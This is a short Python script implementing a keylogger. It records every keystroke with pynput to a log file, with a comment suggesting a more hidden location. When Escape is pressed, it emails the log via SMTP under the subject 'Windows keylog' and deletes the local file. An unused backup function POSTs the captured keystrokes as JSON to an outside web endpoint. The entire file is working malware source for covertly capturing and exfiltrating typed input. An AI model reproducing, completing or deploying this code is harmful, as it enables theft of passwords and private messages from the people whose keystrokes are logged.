
from pynput import keyboard # requires pip3 install 
import json
import requests # requires pip3 install
from email.message import EmailMessage
import smtplib
import yaml # need to do 'pip3 install pyyaml', not yaml 
import os

with open('smtp-creds.yaml', 'r') as file:
    creds = yaml.safe_load(file)
addr = creds['user']['email']
pw = creds['user']['password']
smtp_server = creds['smtp']
smtp_port = creds['port']

log_path = 'key_log.txt' # ideally, make it a more hidden location

def email_attachment():
    sender = addr
    recipient = addr
    with open(log_path, 'rb') as f:
        file_data = f.read()
    message = "Here's the new log file:"        
    email = EmailMessage()
    email["From"] = sender
    email["To"] = recipient
    email["Subject"] = "Windows keylog"
    email.set_content(message)
    email.add_attachment(file_data, maintype='text', subtype='plain', filename='key_log.txt')

    smtp = smtplib.SMTP(smtp_server, port=smtp_port)
    smtp.starttls()
    smtp.login(sender, pw)
    smtp.sendmail(sender, recipient, email.as_string())
    smtp.quit()


def post_json_log():        # Written as a backup method for email
    with open(log_path,'r') as f:
        lines = f.read().splitlines() # remove newlines

    log_dict = {}
    i = 1

    for l in lines:
        log_dict.update({str(i): l})
        i += 1

    log_dump = json.dumps(log_dict)
    r = requests.post('https://ptsv3.com/t/1234/', log_dump) # temporary location

    if str(r) == '<Response [200]>': # successful POST
        return True
    else:
        return False


def on_press(key):
    try: # will go to except-block if it's a special character 
        k = key.char + '\n'
    except AttributeError:
        k = str(key)[4:] + '\n' # [4:] to strip off 'Key.'
    # print(k)
    with open(log_path, "a") as f: # https://stackoverflow.com/questions/1466000/
        f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        # post_success = post_json_log() # true or false, not currently in use
        email_attachment()
        os.remove(log_path) # delete log file 
        exit()


def main():    
    # Collect keystrokes until Esc pressed
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

main()
